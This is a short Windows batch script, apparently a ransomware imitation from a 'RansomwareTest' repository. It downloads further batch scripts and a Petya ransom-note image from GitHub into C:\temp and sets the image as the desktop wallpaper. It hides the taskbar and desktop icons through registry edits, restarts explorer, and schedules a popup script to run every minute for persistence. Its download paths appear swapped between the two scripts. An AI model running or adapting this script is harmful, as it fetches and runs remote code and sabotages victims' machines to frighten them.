set "TaskName=PopupTask"
set "url1=https://raw.githubusercontent.com/git-TGMB/RansomwareTest/main/popup.bat"
set "url2=https://raw.githubusercontent.com/git-TGMB/RansomwareTest/main/hide.bat"
set "wallpaperurl=https://raw.githubusercontent.com/git-TGMB/RansomwareTest/main/petya-ransom-note.jpg"
set "wallpaperpath=C:\temp\petya-ransom-note.jpg"
set "Script1=C:\temp\hide.bat"
set "Script2=C:\temp\popup.bat"

:: persistence
curl -L -o %Script1% %url1%
curl -L -o %Script2% %url2%
curl -L -o %wallpaperpath% %wallpaperurl%

:: Change wallpaper
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d %wallpaperpath% /f
::RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters

:: Hide taskbar
powershell -command "&{$p='HKCU:SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StuckRects3';$v=(Get-ItemProperty -Path $p).Settings;$v[8]=3;&Set-ItemProperty -Path $p -Name Settings -Value $v;&Stop-Process -f -ProcessName explorer}"

:: Hide desktop icons
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v HideIcons /t REG_DWORD /d 1 /f
taskkill /f /im explorer.exe
start explorer.exe

:: schtask for popup.bat
schtasks /Create /TN "%TaskName%" /TR "%Script2%" /SC MINUTE /MO 1 /RL LIMITED /F
schtasks /Run /TN %TaskName%
